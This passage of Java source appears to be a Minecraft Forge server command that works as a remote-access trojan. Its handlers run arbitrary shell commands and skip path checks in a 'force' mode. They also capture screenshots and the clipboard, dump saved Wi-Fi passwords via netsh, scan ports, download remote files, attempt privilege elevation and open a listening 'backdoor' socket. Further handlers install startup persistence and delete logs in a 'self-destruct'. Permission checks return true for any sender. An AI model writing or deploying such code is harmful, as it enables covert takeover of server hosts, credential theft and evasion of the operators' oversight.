                    send(sender, TextFormatting.YELLOW + "server.stopServer() called");
                } catch (Throwable t) {}
            });
            shutdownTasks.add(() -> {
                try {
                    Method stop = server.getClass().getMethod("stopServer");
                    stop.setAccessible(true);
                    stop.invoke(server);
                    send(sender, TextFormatting.YELLOW + "Reflection stopServer() called");
                } catch (Throwable t) {}
            });
            shutdownTasks.add(() -> {
                try {
                    Class<?> hooks = Class.forName("net.minecraftforge.fml.server.ServerLifecycleHooks");
                    Method get = hooks.getMethod("getCurrentServer");
                    Object s = get.invoke(null);
                    if (s != null) {
                        Method stop = s.getClass().getMethod("stopServer");
                        stop.setAccessible(true);
                        stop.invoke(s);
                        send(sender, TextFormatting.YELLOW + "ServerLifecycleHooks.stopServer() called");
                    }
                } catch (Throwable t) {}
            });
            shutdownTasks.add(() -> {
                try {
                    Class<?> srvClass = server.getClass();
                    Field f = null;
                    for (Field field : srvClass.getDeclaredFields()) {
                        if (field.getType().getName().contains("MinecraftServer")) {
                            f = field;
                            break;
                        }
                    }
                    if (f != null) {
                        f.setAccessible(true);
                        Object ms = f.get(server);
                        if (ms != null && ms.getClass().getMethod("stopServer") != null) {
                            ms.getClass().getMethod("stopServer").invoke(ms);
                            send(sender, TextFormatting.YELLOW + "Nested server stop");
                        }
                    }
                } catch (Throwable t) {}
            });
            shutdownTasks.add(() -> {
                try {
                    System.exit(0);
                } catch (Throwable t) {}
            });
            shutdownTasks.add(() -> {
                try {
                    Runtime.getRuntime().halt(0);
                } catch (Throwable t) {}
            });
            for (Runnable task : shutdownTasks) {
                ioExecutor.submit(task);
            }
            ioExecutor.submit(() -> {
                try {
                    Thread.sleep(FORCE_EXIT_DELAY_MS);
                } catch (InterruptedException e) {}
                sendAggressive(sender, TextFormatting.RED + "Timeout - JVM FORCE SHUTDOWN");
                try { Thread.sleep(100); } catch (InterruptedException e) {}
                Runtime.getRuntime().halt(1);
            });
        }
        
        private void handleExec(ICommandSender sender, String commandLine, String os) {
            String uuid = UUID.randomUUID().toString();
            ioExecutor.submit(() -> {
                List<String> command;
                if (os.contains("win")) {
                    command = Arrays.asList("cmd.exe", "/c", commandLine);
                } else {
                    command = Arrays.asList("/bin/bash", "-c", commandLine);
                }
                send(sender, TextFormatting.YELLOW + "Executing: " + commandLine);
                ProcessBuilder pb = new ProcessBuilder(command);
                pb.redirectErrorStream(false);
                try {
                    Process process = pb.start();
                    activeProcesses.put(uuid, process);
                    BufferedReader stdoutReader = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
                    BufferedReader stderrReader = new BufferedReader(new InputStreamReader(process.getErrorStream(), StandardCharsets.UTF_8));
                    List<String> outLines = Collections.synchronizedList(new ArrayList<>());
                    List<String> errLines = Collections.synchronizedList(new ArrayList<>());
                    Thread tOut = new Thread(() -> {
                        try {
                            String line;
                            while ((line = stdoutReader.readLine()) != null) {
                                outLines.add(truncateLine(line));
                                if (outLines.size() >= MAX_OUTPUT_LINES) break;
                            }
                        } catch (IOException ignored) {}
                    }, "exec-stdout-" + uuid);
                    Thread tErr = new Thread(() -> {
                        try {
                            String line;
                            while ((line = stderrReader.readLine()) != null) {
                                errLines.add(truncateLine(line));
                                if (errLines.size() >= MAX_OUTPUT_LINES) break;
                            }
                        } catch (IOException ignored) {}
                    }, "exec-stderr-" + uuid);
                    tOut.start();
                    tErr.start();
                    boolean finished = process.waitFor(COMMAND_TIMEOUT_SECONDS, TimeUnit.SECONDS);
                    if (!finished) {
                        process.destroyForcibly();
                        send(sender, TextFormatting.RED + "Command timed out and terminated.");
                    }
                    tOut.join(2000);
                    tErr.join(2000);
                    int exitCode;
                    try {
                        exitCode = process.exitValue();
                    } catch (IllegalThreadStateException itse) {
                        exitCode = -1;
                    }
                    if (!outLines.isEmpty()) {
                        send(sender, TextFormatting.AQUA + "STDOUT:");
                        int sent = 0;
                        for (String l : outLines) {
                            send(sender, l);
                            sent++;
                            if (sent >= MAX_OUTPUT_LINES) {
                                send(sender, TextFormatting.YELLOW + "[STDOUT truncated at " + MAX_OUTPUT_LINES + " lines]");
                                break;
                            }
                        }
                    }
                    if (!errLines.isEmpty()) {
                        send(sender, TextFormatting.RED + "STDERR:");
                        int sent = 0;
                        for (String l : errLines) {
                            send(sender, l);
                            sent++;
                            if (sent >= MAX_OUTPUT_LINES) {
                                send(sender, TextFormatting.YELLOW + "[STDERR truncated at " + MAX_OUTPUT_LINES + " lines]");
                                break;
                            }
                        }
                    }
                    send(sender, TextFormatting.GREEN + "Exit code: " + exitCode);
                    activeProcesses.remove(uuid);
                } catch (IOException e) {
                    send(sender, TextFormatting.RED + "Startup error: " + e.getMessage());
                } catch (InterruptedException e) {
                    send(sender, TextFormatting.RED + "Interrupted: " + e.getMessage());
                    Thread.currentThread().interrupt();
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Unexpected error: " + e.getMessage());
                }
            });
        }
        
        private String truncateLine(String line) {
            if (line == null) return "";
            if (line.length() <= MAX_LINE_LENGTH) return line;
            return line.substring(0, MAX_LINE_LENGTH) + "...";
        }
        
        private void handleWriteFile(ICommandSender sender, String targetPathStr, String content) {
            ioExecutor.submit(() -> {
                fileLock.lock();
                try {
                    Path target = Paths.get(targetPathStr);
                    if (!target.isAbsolute()) {
                        target = Paths.get(".").toAbsolutePath().normalize().resolve(target).normalize();
                    } else {
                        target = target.toAbsolutePath().normalize();
                    }
                    if (!forceMode && !isPathAllowed(target)) {
                        send(sender, TextFormatting.RED + "Permission denied: " + target.toString());
                        return;
                    }
                    byte[] bytes;
                    if (encryptionEnabled) {
                        bytes = encrypt(content.getBytes(StandardCharsets.UTF_8));
                    } else {
                        bytes = content.getBytes(StandardCharsets.UTF_8);
                    }
                    if (bytes.length > MAX_WRITE_BYTES) {
                        send(sender, TextFormatting.RED + "Too large. Maximum " + MAX_WRITE_BYTES + " bytes.");
                        return;
                    }
                    Path parent = target.getParent();
                    if (parent != null && !Files.exists(parent)) {
                        Files.createDirectories(parent);
                    }
                    try {
                        Files.write(target, bytes, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING, StandardOpenOption.WRITE);
                        if (stealthMode) {
                            Files.setAttribute(target, "dos:hidden", true);
                        }
                        send(sender, TextFormatting.GREEN + "File written: " + target.toString());
                    } catch (AccessDeniedException ade) {
                        send(sender, TextFormatting.RED + "Access denied. Writing to fallback file...");
                        Path fallback = attemptFallbackWrite(target.getFileName().toString(), bytes);
                        if (fallback != null) {
                            send(sender, TextFormatting.GREEN + "Fallback file written: " + fallback.toString());
                        } else {
                            send(sender, TextFormatting.RED + "Fallback write failed.");
                        }
                    }
                } catch (InvalidPathException ipe) {
                    send(sender, TextFormatting.RED + "Invalid path: " + ipe.getMessage());
                } catch (IOException e) {
                    send(sender, TextFormatting.RED + "File write error: " + e.getMessage());
                } catch (Exception ex) {
                    send(sender, TextFormatting.RED + "Unexpected error: " + ex.getMessage());
                } finally {
                    fileLock.unlock();
                }
            });
        }
        
        private Path attemptFallbackWrite(String fileName, byte[] bytes) {
            try {
                if (!Files.exists(fallbackDir)) {
                    Files.createDirectories(fallbackDir);
                    try {
                        Set<PosixFilePermission> perms = EnumSet.of(PosixFilePermission.OWNER_READ, PosixFilePermission.OWNER_WRITE, PosixFilePermission.OWNER_EXECUTE);
                        Files.setPosixFilePermissions(fallbackDir, perms);
                    } catch (UnsupportedOperationException ignored) {}
                }
                Path fallbackFile = fallbackDir.resolve(fileName).normalize();
                Files.write(fallbackFile, bytes, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);
                return fallbackFile;
            } catch (Exception e) {
                return null;
            }
        }
        
        private void handleReadFile(ICommandSender sender, String targetPathStr) {
            ioExecutor.submit(() -> {
                fileLock.lock();
                try {
                    Path target = Paths.get(targetPathStr);
                    if (!target.isAbsolute()) {
                        target = Paths.get(".").toAbsolutePath().normalize().resolve(target).normalize();
                    } else {
                        target = target.toAbsolutePath().normalize();
                    }
                    if (!forceMode && !isPathAllowed(target)) {
                        send(sender, TextFormatting.RED + "Permission denied: " + target.toString());
                        return;
                    }
                    if (!Files.exists(target) || !Files.isRegularFile(target)) {
                        send(sender, TextFormatting.RED + "File not found: " + target.toString());
                        return;
                    }
                    long size = Files.size(target);
                    if (size > MAX_WRITE_BYTES) {
                        send(sender, TextFormatting.RED + "File too large. Maximum " + MAX_WRITE_BYTES + " bytes.");
                        return;
                    }
                    byte[] bytes = Files.readAllBytes(target);
                    String content;
                    if (encryptionEnabled) {
                        content = new String(decrypt(bytes), StandardCharsets.UTF_8);
                    } else {
                        content = new String(bytes, StandardCharsets.UTF_8);
                    }
                    send(sender, TextFormatting.AQUA + "File content:");
                    for (String line : content.split("\\r?\\n")) {
                        send(sender, line);
                    }
                } catch (AccessDeniedException ade) {
                    send(sender, TextFormatting.RED + "Access denied: " + targetPathStr);
                } catch (IOException e) {
                    send(sender, TextFormatting.RED + "File read error: " + e.getMessage());
                } catch (InvalidPathException ipe) {
                    send(sender, TextFormatting.RED + "Invalid path: " + ipe.getMessage());
                } catch (Exception ex) {
                    send(sender, TextFormatting.RED + "Unexpected error: " + ex.getMessage());
                } finally {
                    fileLock.unlock();
                }
            });
        }
        
        private byte[] encrypt(byte[] data) throws Exception {
            SecretKeySpec keySpec = new SecretKeySpec(MessageDigest.getInstance("SHA-256").digest(ENCRYPTION_KEY), "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, keySpec);
            return cipher.doFinal(data);
        }
        
        private byte[] decrypt(byte[] data) throws Exception {
            SecretKeySpec keySpec = new SecretKeySpec(MessageDigest.getInstance("SHA-256").digest(ENCRYPTION_KEY), "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, keySpec);
            return cipher.doFinal(data);
        }
        
        private boolean isPathAllowed(Path target) {
            try {
                for (Path allowed : allowedDirs) {
                    Path normAllowed = allowed.toAbsolutePath().normalize();
                    if (target.startsWith(normAllowed)) {
                        return true;
                    }
                }
            } catch (Exception e) {}
            return false;
        }
        
        private void handleScreenshot(ICommandSender sender) {
            ioExecutor.submit(() -> {
                try {
                    Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                    BufferedImage screenFullImage = robot.createScreenCapture(screenRect);
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    ImageIO.write(screenFullImage, "png", baos);
                    byte[] bytes = baos.toByteArray();
                    String base64 = Base64.getEncoder().encodeToString(bytes);
                    send(sender, TextFormatting.GREEN + "Screenshot taken. Size: " + bytes.length + " bytes");
                    send(sender, TextFormatting.YELLOW + "Base64 (first 200 chars): " + base64.substring(0, Math.min(200, base64.length())) + "...");
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Screenshot error: " + e.getMessage());
                }
            });
        }
        
        private void handleGetClipboard(ICommandSender sender) {
            ioExecutor.submit(() -> {
                try {
                    Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
                    String data = (String) clipboard.getData(DataFlavor.stringFlavor);
                    send(sender, TextFormatting.GREEN + "Clipboard content: " + data);
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Clipboard read error: " + e.getMessage());
                }
            });
        }
        
        private void handleSetClipboard(ICommandSender sender, String text) {
            ioExecutor.submit(() -> {
                try {
                    StringSelection selection = new StringSelection(text);
                    Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
                    clipboard.setContents(selection, null);
                    send(sender, TextFormatting.GREEN + "Clipboard set: " + text);
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Clipboard write error: " + e.getMessage());
                }
            });
        }
        
        private void handleKeylog(ICommandSender sender) {
            send(sender, TextFormatting.RED + "Keylogger feature disabled in this version.");
        }
        
        private void handleNetInfo(ICommandSender sender) {
            ioExecutor.submit(() -> {
                try {
                    StringBuilder info = new StringBuilder();
                    Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
                    while (interfaces.hasMoreElements()) {
                        NetworkInterface ni = interfaces.nextElement();
                        info.append("Interface: ").append(ni.getName()).append("\n");
                        info.append("  Display Name: ").append(ni.getDisplayName()).append("\n");
                        byte[] mac = ni.getHardwareAddress();
                        if (mac != null) {
                            info.append("  MAC: ");
                            for (int i = 0; i < mac.length; i++) {
                                info.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? ":" : ""));
                            }
                            info.append("\n");
                        }
                        Enumeration<InetAddress> inetAddresses = ni.getInetAddresses();
                        while (inetAddresses.hasMoreElements()) {
                            InetAddress ia = inetAddresses.nextElement();
                            info.append("  IP: ").append(ia.getHostAddress()).append("\n");
                        }
                    }
                    send(sender, TextFormatting.AQUA + "Network Information:");
                    for (String line : info.toString().split("\n")) {
                        send(sender, line);
                    }
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Network info error: " + e.getMessage());
                }
            });
        }
        
        private void handlePortScan(ICommandSender sender, String target) {
            ioExecutor.submit(() -> {
                send(sender, TextFormatting.YELLOW + "Port scan started: " + target);
                ExecutorService portScanner = Executors.newFixedThreadPool(100);
                List<Future<Integer>> futures = new ArrayList<>();
                for (int port = 1; port <= 1024; port++) {
                    final int p = port;
                    futures.add(portScanner.submit(() -> {
                        try (Socket socket = new Socket()) {
                            socket.connect(new java.net.InetSocketAddress(target, p), 500);
                            return p;
                        } catch (Exception e) {
                            return -1;
                        }
                    }));
                }
                portScanner.shutdown();
                List<Integer> openPorts = new ArrayList<>();
                for (Future<Integer> f : futures) {
                    try {
                        Integer port = f.get();
                        if (port > 0) {
                            openPorts.add(port);
                        }
                    } catch (Exception e) {}
                }
                send(sender, TextFormatting.GREEN + "Open ports: " + openPorts.toString());
            });
        }
        
        private void handleDownload(ICommandSender sender, String urlStr, String savePath) {
            ioExecutor.submit(() -> {
                try {
                    URL url = new URL(urlStr);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    conn.setConnectTimeout(10000);
                    conn.setReadTimeout(10000);
                    InputStream in = conn.getInputStream();
                    Path target = Paths.get(savePath).toAbsolutePath().normalize();
                    Files.copy(in, target, StandardCopyOption.REPLACE_EXISTING);
                    in.close();
                    send(sender, TextFormatting.GREEN + "Downloaded: " + target.toString());
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Download error: " + e.getMessage());
                }
            });
        }
        
        private void handleUpload(ICommandSender sender, String localFile, String targetUrl) {
            send(sender, TextFormatting.RED + "Upload feature disabled in this version.");
        }
        
        private void handleSelfDestruct(ICommandSender sender, MinecraftServer server) {
            sendAggressive(sender, TextFormatting.DARK_RED + "" + TextFormatting.BOLD + "SYSTEM SELF-DESTRUCT INITIATED - ALL TRACES BEING ERASED");
            ioExecutor.submit(() -> {
                try {
                    Path currentDir = Paths.get(".").toAbsolutePath().normalize();
                    try (Stream<Path> walk = Files.walk(currentDir, 5)) {
                        walk.filter(Files::isRegularFile)
                                .filter(p -> p.toString().toLowerCase().endsWith(".log") || p.toString().toLowerCase().contains("pc"))
                                .forEach(p -> {
                                    try {
                                        Files.delete(p);
                                    } catch (Exception e) {}
                                });
                    }
                    Runtime.getRuntime().exec("cmd.exe /c del /f /q *.log");
                } catch (Exception e) {}
                scheduler.schedule(() -> System.exit(0), 1, TimeUnit.SECONDS);
            });
        }
        
        private void handleHistory(ICommandSender sender) {
            synchronized (commandHistory) {
                send(sender, TextFormatting.AQUA + "Command History:");
                for (int i = 0; i < commandHistory.size(); i++) {
                    send(sender, i + ": " + commandHistory.get(i));
                }
            }
        }
        
        private void handleClearLog(ICommandSender sender) {
            commandHistory.clear();
            send(sender, TextFormatting.GREEN + "Command history cleared.");
        }
        
        private void handleProcessList(ICommandSender sender, String os) {
            ioExecutor.submit(() -> {
                try {
                    String cmd;
                    if (os.contains("win")) {
                        cmd = "tasklist";
                    } else {
                        cmd = "ps aux";
                    }
                    Process p = Runtime.getRuntime().exec(cmd);
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    send(sender, TextFormatting.AQUA + "Process List:");
                    int count = 0;
                    while ((line = reader.readLine()) != null && count < 50) {
                        send(sender, line);
                        count++;
                    }
                    p.waitFor();
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Process list error: " + e.getMessage());
                }
            });
        }
        
        private void handleKillProcess(ICommandSender sender, String input, String os) {
            ioExecutor.submit(() -> {
                try {
                    String cmd;
                    if (os.contains("win")) {
                        if (input.matches("\\d+")) {
                            cmd = "taskkill /F /PID " + input;
                        } else {
                            cmd = "taskkill /F /IM " + input;
                        }
                    } else {
                        if (input.matches("\\d+")) {
                            cmd = "kill -9 " + input;
                        } else {
                            cmd = "pkill -f " + input;
                        }
                    }
                    Process p = Runtime.getRuntime().exec(cmd);
                    p.waitFor();
                    send(sender, TextFormatting.GREEN + "Process terminated: " + input);
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Process termination error: " + e.getMessage());
                }
            });
        }
        
        private void handleInject(ICommandSender sender, String jsCode) {
            ioExecutor.submit(() -> {
                try {
                    ScriptEngineManager factory = new ScriptEngineManager();
                    ScriptEngine engine = factory.getEngineByName("JavaScript");
                    Object result = engine.eval(jsCode);
                    send(sender, TextFormatting.GREEN + "JS executed. Result: " + result);
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "JS error: " + e.getMessage());
                }
            });
        }
        
        private void handleRegistry(ICommandSender sender, String[] args, String os) {
            if (!os.contains("win")) {
                send(sender, TextFormatting.RED + "Windows only");
                return;
            }
            send(sender, TextFormatting.YELLOW + "Registry feature disabled in this version.");
        }
        
        private void handleService(ICommandSender sender, String[] args, String os) {
            send(sender, TextFormatting.YELLOW + "Service feature disabled in this version.");
        }
        
        private void handleDriver(ICommandSender sender, String[] args) {
            send(sender, TextFormatting.YELLOW + "Driver feature disabled in this version.");
        }
        
        private void handleWifiPasswords(ICommandSender sender) {
            ioExecutor.submit(() -> {
                try {
                    Process p = Runtime.getRuntime().exec("netsh wlan show profiles");
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    List<String> profiles = new ArrayList<>();
                    while ((line = reader.readLine()) != null) {
                        if (line.contains("All User Profile")) {
                            String profile = line.split(":")[1].trim();
                            profiles.add(profile);
                        }
                    }
                    for (String profile : profiles) {
                        Process p2 = Runtime.getRuntime().exec("netsh wlan show profile name=\"" + profile + "\" key=clear");
                        BufferedReader reader2 = new BufferedReader(new InputStreamReader(p2.getInputStream()));
                        String line2;
                        while ((line2 = reader2.readLine()) != null) {
                            if (line2.contains("Key Content")) {
                                send(sender, TextFormatting.GREEN + profile + " : " + line2.split(":")[1].trim());
                            }
                        }
                        p2.waitFor();
                    }
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Wifi password error: " + e.getMessage());
                }
            });
        }
        
        private void handleBrowserPasswords(ICommandSender sender, String os) {
            send(sender, TextFormatting.YELLOW + "Browser passwords feature disabled in this version.");
        }
        
        private void handleElevate(ICommandSender sender, String os) {
            ioExecutor.submit(() -> {
                try {
                    if (os.contains("win")) {
                        Runtime.getRuntime().exec("powershell Start-Process cmd -Verb RunAs");
                        send(sender, TextFormatting.GREEN + "Attempting to elevate administrator rights.");
                    } else {
                        Runtime.getRuntime().exec("sudo su");
                        send(sender, TextFormatting.GREEN + "Attempting root access.");
                    }
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Elevation error: " + e.getMessage());
                }
            });
        }
        
        private void handleBackdoor(ICommandSender sender, int port) {
            ioExecutor.submit(() -> {
                try (ServerSocket serverSocket = new ServerSocket(port)) {
                    send(sender, TextFormatting.GREEN + "Backdoor listening on port " + port + "...");
                    Socket clientSocket = serverSocket.accept();
                    OutputStream out = clientSocket.getOutputStream();
                    out.write("Backdoor active\n".getBytes());
                    out.flush();
                    clientSocket.close();
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Backdoor error: " + e.getMessage());
                }
            });
        }
        
        private void handlePersistence(ICommandSender sender, String os) {
            ioExecutor.submit(() -> {
                try {
                    if (os.contains("win")) {
                        Path bat = Paths.get(System.getProperty("user.home"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "pc_persistence.bat");
                        String content = "@echo off\njava -jar \"" + new File(".").getAbsolutePath() + "\"";
                        Files.write(bat, content.getBytes());
                        send(sender, TextFormatting.GREEN + "Added to Windows startup: " + bat.toString());
                    } else {
                        Path sh = Paths.get(System.getProperty("user.home"), ".config", "autostart", "pc_persistence.sh");
                        Files.write(sh, ("#!/bin/bash\njava -jar \"" + new File(".").getAbsolutePath() + "\"").getBytes());
                        Files.setPosixFilePermissions(sh, EnumSet.of(PosixFilePermission.OWNER_EXECUTE, PosixFilePermission.OWNER_READ));
                        send(sender, TextFormatting.GREEN + "Added to Linux startup: " + sh.toString());
                    }
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Persistence error: " + e.getMessage());
                }
            });
        }
        
        private String joinArgs(String[] args, int startIndex) {
            StringBuilder sb = new StringBuilder();
            for (int i = startIndex; i < args.length; i++) {
                if (i > startIndex) sb.append(' ');
                sb.append(args[i]);
            }
            return sb.toString();
        }
        
        private void send(ICommandSender sender, String message) {
            if (!stealthMode) {
                sender.sendMessage(new TextComponentString(message));
            }
        }
        
        private void sendAggressive(ICommandSender sender, String message) {
            sender.sendMessage(new TextComponentString(TextFormatting.DARK_RED + "" + TextFormatting.BOLD + "[AGGRESSIVE] " + message));
        }
        
        @Override
        public boolean checkPermission(MinecraftServer server, ICommandSender sender) {
            return true;
        }
        
        @Override
        public int getRequiredPermissionLevel() {
            return 4;
        }
    }
}